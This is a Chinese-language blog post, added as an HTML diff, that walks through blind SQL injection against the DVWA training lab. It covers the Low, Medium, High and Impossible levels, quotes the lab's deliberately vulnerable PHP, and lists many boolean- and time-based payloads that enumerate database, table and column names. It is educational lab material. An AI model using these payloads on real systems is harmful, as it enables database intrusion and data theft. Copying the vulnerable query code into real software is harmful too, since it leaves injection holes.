@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    SQL Injection(Blind) |  Hexo
+  </title>
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+  
+<script src="/js/pace.min.js"></script>
+
+
+  
+
+  
+
+<meta name="generator" content="Hexo 4.1.1"></head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content">
+      <section class="outer">
+  <article id="post-SQL Injection(Blind)" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  SQL Injection(Blind)
+</h1>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/01/09/SQL%20Injection(Blind)/" class="article-date">
+  <time datetime="2020-01-09T06:14:53.276Z" itemprop="datePublished">2020-01-09</time>
+</a>
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><p>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
+<h2 id="手工盲注思路"><a href="#手工盲注思路" class="headerlink" title="手工盲注思路"></a>手工盲注思路</h2><p>手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p>
+<p>盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里由于实验环境的限制，只演示基于布尔的盲注与基于时间的盲注。</p>
+<p>下面简要介绍手工盲注的步骤（可与之前的<a href="http://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">手工注入</a>作比较）：</p>
+<p>1.判断是否存在注入，注入是字符型还是数字型</p>
+<p>2.猜解当前数据库名</p>
+<p>3.猜解数据库中的表名</p>
+<p>4.猜解表中的字段名</p>
+<p>5.猜解数据</p>
+<p>下面对四种级别的代码进行分析。</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_GET[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $getid  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $getid ); &#x2F;&#x2F; Removed &#39;or die&#39; to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; @mysql_numrows( $result ); &#x2F;&#x2F; The &#39;@&#39; character suppresses errors </span><br><span class="line">    if( $num &gt; 0 ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        &#x2F;&#x2F; User wasn&#39;t found, so the page wasn&#39;t! </span><br><span class="line">        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种，‘</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User ID exists in the database.</span><br></pre></td></tr></table></figure>
+
+<p>‘与‘</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;User ID is MISSING from the database.&#96;</span><br></pre></td></tr></table></figure>
+
+<p>‘，因此这里是SQL盲注漏洞。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先演示<strong>基于布尔的盲注</strong>：</p>
+<h3 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>输入1，显示相应用户存在如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/23.PNG" alt=""></p>
+<p>输入1’ and 1=1 #，显示存在，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/24.PNG" alt=""></p>
+<p>输入1’ and 1=2 #，显示不存在，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/25.PNG" alt=""></p>
+<p>说明存在字符型的SQL盲注。</p>
+<h3 id="2-猜解当前数据库名"><a href="#2-猜解当前数据库名" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p>
+<p>输入1’ and length(database())=1 #，显示不存在；</p>
+<p>输入1’ and length(database())=2 #，显示不存在；</p>
+<p>输入1’ and length(database())=3 #，显示不存在；</p>
+<p>输入1’ and length(database())=4 #，显示存在，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/26.PNG" alt=""></p>
+<p>说明数据库名长度为4。</p>
+<p>下面采用二分法猜解数据库名。</p>
+<p>输入1’ and ascii(substr(database(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</p>
+<p>输入1’ and ascii(substr(database(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p>
+<p>输入1’ and ascii(substr(database(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</p>
+<p>输入1’ and ascii(substr(database(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</p>
+<p>输入1’ and ascii(substr(database(),1,1))=100 #，显示存在，说明数据库名的第一个字符的ascii值等于100（小写字母d的ascii值），即小写字母d，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/27.PNG" alt=""></p>
+<p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。</p>
+<h3 id="3-猜解数据库中的表名"><a href="#3-猜解数据库中的表名" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3><p>首先猜解数据库中表的数量：</p>
+<p>1’ and (select count(table_name) from information_schema.tables where table_schema=’dvwa’)=1 # 显示不存在</p>
+<p>1’ and (select count(table_name) from information_schema.tables where table_schema=’dvwa’)=2 # 显示存在,如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/28.PNG" alt=""></p>
+<p>说明数据库中共有两个表。</p>
+<p>接着挨个猜解表名：</p>
+<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在</p>
+<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在</p>
+<p>…</p>
+<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在,如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/29.PNG" alt=""></p>
+<p>说明第一个表名长度为9。</p>
+<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在</p>
+<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在</p>
+<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在</p>
+<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 # 显示存在，如下图所示:</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/30.PNG" alt=""></p>
+<p>说明第一个表的名字的第一个字符为小写字母g。</p>
+<p>…</p>
+<p>重复上述步骤，即可猜解出两个表名（guestbook、users）。</p>
+<h3 id="4-猜解表中的字段名"><a href="#4-猜解表中的字段名" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><p>首先猜解表中字段的数量：</p>
+<p>1’ and (select count(column_name) from information_schema.columns where table_name= ‘users’)=1 # 显示不存在</p>
+<p>…</p>
+<p>1’ and (select count(column_name)from information_schema.columns where table_name=’users’)=8 # 显示存在</p>
+<p>说明users表有8个字段。</p>
+<p>接着挨个猜解字段名：</p>
+<p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在</p>
+<p>…</p>
+<p>1’ and length(substr((select column_name from information_schema.columns where table_name= ‘users’ limit 0,1),1))=7 # 显示存在</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/31.PNG" alt=""></p>
+<p>说明users表的第一个字段为7个字符长度。</p>
+<h3 id="5-猜解数据"><a href="#5-猜解数据" class="headerlink" title="5.猜解数据"></a>5.猜解数据</h3><p>同样采用二分法。</p>
+<p>还可以使用<strong>基于时间的盲注</strong>：</p>
+<h3 id="1-判断是否存在注入，注入是字符型还是数字型-1"><a href="#1-判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>输入1’ and sleep(5) #，感觉到明显延迟；</p>
+<p>输入1 and sleep(5) #，没有延迟；</p>
+<p>说明存在字符型的基于时间的盲注。</p>
+<h3 id="2-猜解当前数据库名-1"><a href="#2-猜解当前数据库名-1" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><p>首先猜解数据名的长度：</p>
+<p>1’ and if(length(database())=1,sleep(5),1) # 没有延迟</p>
+<p>1’ and if(length(database())=2,sleep(5),1) # 没有延迟</p>
+<p>1’ and if(length(database())=3,sleep(5),1) # 没有延迟</p>
+<p>1’ and if(length(database())=4,sleep(5),1) # 明显延迟</p>
+<p>说明数据库名长度为4个字符。</p>
+<p>接着采用二分法猜解数据库名：</p>
+<p>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</p>
+<p>…</p>
+<p>1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟</p>
+<p>1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</p>
+<p>说明数据库名的第一个字符为小写字母d。</p>
+<p>…</p>
+<p>重复上述步骤，即可猜解出数据库名。</p>
+<h3 id="3-猜解数据库中的表名-1"><a href="#3-猜解数据库中的表名-1" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3><p>首先猜解数据库中表的数量：</p>
+<p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟</p>
+<p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</p>
+<p>说明数据库中有两个表。</p>
+<p>接着挨个猜解表名：</p>
+<p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟</p>
+<p>…</p>
+<p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</p>
+<p>说明第一个表名的长度为9个字符。</p>
+<p>采用二分法即可猜解出表名。</p>
+<h3 id="4-猜解表中的字段名-1"><a href="#4-猜解表中的字段名-1" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><p>首先猜解表中字段的数量：</p>
+<p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟</p>
+<p>…</p>
+<p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟</p>
+<p>说明users表中有8个字段。</p>
+<p>接着挨个猜解字段名：</p>
+<p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟</p>
+<p>…</p>
+<p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟</p>
+<p>说明users表的第一个字段长度为7个字符。</p>
+<p>采用二分法即可猜解出各个字段名。</p>
+<h3 id="5-猜解数据-1"><a href="#5-猜解数据-1" class="headerlink" title="5.猜解数据"></a>5.猜解数据</h3><p>同样采用二分法。</p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_POST[ &#39;id&#39; ]; </span><br><span class="line">    $id &#x3D; mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $getid  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; $id;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $getid ); &#x2F;&#x2F; Removed &#39;or die&#39; to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; @mysql_numrows( $result ); &#x2F;&#x2F; The &#39;@&#39; character suppresses errors </span><br><span class="line">    if( $num &gt; 0 ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p>
+<p>\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p>
+<p>如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/32.PNG" alt=""></p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。</p>
+<p>之前已经介绍了详细的盲注流程，这里就简要演示几个。</p>
+<p>首先是<strong>基于布尔的盲注</strong>：</p>
+<p>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
+<p>抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
+<p>抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</p>
+<p>然后是<strong>基于时间的盲注</strong>：</p>
+<p>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；</p>
+<p>抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；</p>
+<p>抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_COOKIE[ &#39;id&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_COOKIE[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $getid  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39; LIMIT 1;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $getid ); &#x2F;&#x2F; Removed &#39;or die&#39; to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; @mysql_numrows( $result ); &#x2F;&#x2F; The &#39;@&#39; character suppresses errors </span><br><span class="line">    if( $num &gt; 0 ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        &#x2F;&#x2F; Might sleep a random amount </span><br><span class="line">        if( rand( 0, 5 ) &#x3D;&#x3D; 3 ) &#123; </span><br><span class="line">            sleep( rand( 2, 4 ) ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; User wasn&#39;t found, so the page wasn&#39;t! </span><br><span class="line">        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示<strong>基于布尔的盲注</strong>：</p>
+<p>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
+<p>抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
+<p>抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_GET[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Was a number entered? </span><br><span class="line">    if(is_numeric( $id )) &#123; </span><br><span class="line">        &#x2F;&#x2F; Check the database </span><br><span class="line">        $data &#x3D; $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id &#x3D; (:id) LIMIT 1;&#39; ); </span><br><span class="line">        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Get results </span><br><span class="line">        if( $data-&gt;rowCount() &#x3D;&#x3D; 1 ) &#123; </span><br><span class="line">            &#x2F;&#x2F; Feedback for end user </span><br><span class="line">            echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            &#x2F;&#x2F; User wasn&#39;t found, so the page wasn&#39;t! </span><br><span class="line">            header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); </span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Feedback for end user </span><br><span class="line">            echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p>
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/01/09/SQL%20Injection(Blind)/" data-id="ck56chf940001fcvogprlge6g"
+        class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2020/01/09/XSS_R/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            XSS_R
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/01/09/SQL%20Injection/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">SQL Injection</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+<!-- valine评论 -->
+<div id="vcomments-box">
+    <div id="vcomments">
+    </div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: '',
+        app_key: '',
+        path: window.location.pathname,
+        avatar: 'mp',
+        placeholder: '给我的文章加点评论吧~',
+        recordIP: true
+    });
+    const infoEle = document.querySelector('#vcomments .info');
+    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+        infoEle.childNodes.forEach(function (item) {
+            item.parentNode.removeChild(item);
+        });
+    }
+</script>
+<style>
+    #vcomments-box {
+        padding: 5px 30px;
+    }
+
+    @media screen and (max-width: 800px) {
+        #vcomments-box {
+            padding: 5px 0px;
+        }
+    }
+
+    #vcomments-box #vcomments {
+        background-color: #fff;
+    }
+
+    .v .vlist .vcard .vh {
+        padding-right: 20px;
+    }
+
+    .v .vlist .vcard {
+        padding-left: 10px;
+    }
+</style>
+
+  
+
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2015-2020
+        John Doe
+      </li>
+      <li>
+        
+        
+        
+        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a> by shenyu
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <ul class="list-inline">
+  <li>PV:<span id="busuanzi_value_page_pv"></span></li>
+  <li>UV:<span id="busuanzi_value_site_uv"></span></li>
+</ul>
+        
+      </li>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+    <div class="to_top">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+      </div>
+    </main>
+    
+    <aside class="sidebar">
+      
+        <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Hexo"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">目录</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="http://shenyu-vip.lofter.com" target="_blank" rel="noopener">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2019/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
